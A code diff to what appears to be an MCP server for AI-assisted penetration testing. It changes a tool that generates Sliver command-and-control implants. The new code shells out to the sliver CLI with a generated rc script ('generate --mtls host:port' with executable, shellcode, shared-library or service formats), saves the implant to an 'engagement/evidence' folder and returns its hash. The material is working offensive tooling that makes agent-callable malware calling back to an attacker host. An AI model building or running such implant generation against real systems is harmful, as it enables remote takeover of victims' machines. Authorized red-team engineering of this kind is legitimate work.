@@ -209,58 +209,73 @@ def create_server() -> FastMCP:
         """
         if not mtls_host:
             return "ERROR: mtls_host is required (attackbox callback IP)."
-        if err := await _require_client():
-            return err
+
+        # Use sliver CLI for generation — sliver-py protobuf stubs are
+        # out of sync with Sliver 1.7.x and fail with "record not found".
+        import shutil
+        import subprocess
+
+        sliver_bin = shutil.which("sliver")
+        if not sliver_bin:
+            return "ERROR: sliver client binary not found in PATH."
+
+        config_path = _find_config()
+        if config_path is None:
+            return _NOT_CONFIGURED
+
+        evidence_dir = _PROJECT_ROOT / "engagement" / "evidence"
+        evidence_dir.mkdir(parents=True, exist_ok=True)
+
+        ext = {"linux": "", "windows": ".exe", "darwin": ""}.get(
+            target_os, ""
+        )
+        implant_name = name or f"implant-{int(time.time())}"
+        filename = f"{implant_name}{ext}"
+        filepath = evidence_dir / filename
 
         try:
-            from sliver import client_pb2
+            # Build sliver console command via --rc script
+            rc_file = _PROJECT_ROOT / "engagement" / ".sliver-generate.rc"
+            cmd = (
+                f"generate --mtls {mtls_host}:{mtls_port} "
+                f"--os {target_os} --arch {arch} "
+                f"--save {filepath} --skip-symbols"
+            )
+            if format == "shellcode":
+                cmd = cmd.replace("generate ", "generate --format shellcode ")
+            elif format == "shared":
+                cmd = cmd.replace("generate ", "generate --format shared-lib ")
+            elif format == "service":
+                cmd = cmd.replace("generate ", "generate --format service ")
+            if name:
+                cmd += f" --name {name}"
 
-            c2 = [client_pb2.ImplantC2(
-                URL=f"mtls://{mtls_host}:{mtls_port}",
-                Priority=0,
-            )]
+            rc_file.write_text(cmd + "\n")
 
-            format_map = {
-                "exe": client_pb2.EXECUTABLE,
-                "shared": client_pb2.SHARED_LIB,
-                "shellcode": client_pb2.SHELLCODE,
-                "service": client_pb2.SERVICE,
-            }
-
-            config = client_pb2.ImplantConfig(
-                IsBeacon=False,
-                GOOS=target_os,
-                GOARCH=arch,
-                Format=format_map.get(format, client_pb2.EXECUTABLE),
-                ObfuscateSymbols=True,
-                C2=c2,
-                Name=name or "",
+            result = subprocess.run(
+                [sliver_bin, "console", "--rc", str(rc_file)],
+                capture_output=True, text=True, timeout=600,
+                env={**os.environ, "SLIVER_CONFIG": str(config_path)},
             )
 
-            client = await _get_client()
-            result = await client.generate_implant(config)
+            rc_file.unlink(missing_ok=True)
 
-            evidence_dir = _PROJECT_ROOT / "engagement" / "evidence"
-            evidence_dir.mkdir(parents=True, exist_ok=True)
+            if not filepath.exists():
+                return (
+                    f"ERROR: Implant generation failed.\n"
+                    f"stdout: {result.stdout[-500:] if result.stdout else ''}\n"
+                    f"stderr: {result.stderr[-500:] if result.stderr else ''}"
+                )
 
-            ext = {"linux": "", "windows": ".exe", "darwin": ""}.get(
-                target_os, ""
-            )
-            implant_name = name or f"implant-{int(time.time())}"
-            filename = f"{implant_name}{ext}"
-            filepath = evidence_dir / filename
-
-            with open(filepath, "wb") as f:
-                f.write(result.File.Data)
+            file_size = filepath.stat().st_size
+            sha256 = hashlib.sha256(filepath.read_bytes()).hexdigest()
             filepath.chmod(0o755)
-
-            sha256 = hashlib.sha256(result.File.Data).hexdigest()
 
             return json.dumps({
                 "status": "generated",
-                "name": result.File.Name,
+                "name": filename,
                 "path": str(filepath),
-                "size": len(result.File.Data),
+                "size": file_size,
                 "sha256": sha256,
                 "os": target_os,
                 "arch": arch,
